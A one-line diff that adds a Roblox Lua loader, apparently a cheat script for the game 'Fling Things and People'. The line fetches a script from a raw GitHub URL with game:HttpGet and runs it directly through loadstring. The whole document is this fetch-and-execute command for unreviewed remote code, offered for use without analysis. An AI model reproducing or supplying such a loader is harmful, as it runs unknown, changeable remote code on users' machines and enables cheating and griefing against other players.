@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/fling-things-and-people-spam6-9rgobu1qk7myoo.lua"))()
